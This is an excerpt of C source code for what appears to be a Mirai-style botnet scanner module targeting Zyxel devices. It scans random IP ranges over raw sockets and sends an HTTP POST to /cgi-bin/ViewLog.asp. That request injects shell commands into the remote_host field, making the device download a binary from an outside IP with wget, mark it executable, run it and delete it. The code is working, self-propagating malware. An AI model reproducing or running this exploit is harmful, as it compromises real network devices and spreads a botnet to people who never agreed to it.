...
int zyxel_range[] = {90,91,92,93,94,95,96,80,82,83,190,57,50,46,70,71,71,73,37,35,181,178,62,213,212,162,84,81,56,13,40,44,47,178,170,181,101,119,};
...
void zyxelscanner_scanner_init(void)
{
    ...
    {
        #ifdef DEBUG
            printf("[ZyxelRep] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    ...
    {
        #ifdef DEBUG
            printf("[ZyxelRep] failed to set IP_HDRINCL, cannot scan\n");
        #endif
    ...
    #ifdef DEBUG
        printf("[scanner_zyxel] ZyxelRep process initialized. scanning started.\n");
    #endif
        ...
        for(i = 0; i < zyxelscanner_SCANNER_MAX_CONNS; i++)
        {
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    ...
                    {
                        #ifdef DEBUG
                            printf("[ZyxelRep] FD%d sending payload\n", conn->fd);
                        #endif
        
                        util_strcpy(conn->payload_buf, "POST /cgi-bin/ViewLog.asp HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: MtmKilledYou\r\nContent-Length: 176\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://74.201.28.102/idk/home.arm7;chmod+777+home.arm7;./home.arm7;rm+-rf+home.arm7%3b%23&remoteSubmit=Save\r\n\r\n");
                    ...
                    {
                        #ifdef DEBUG
                            printf("[ZyxelRep] FD%d finnished\n", conn->fd);
                        #endif
...
static ipv4_t zyxelscanner_get_random_ip(void)
{
    ...
    do
    {
        ...
        int range = rand() % (sizeof(zyxel_range)/sizeof(char *));

        o1 = zyxel_range[range];
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
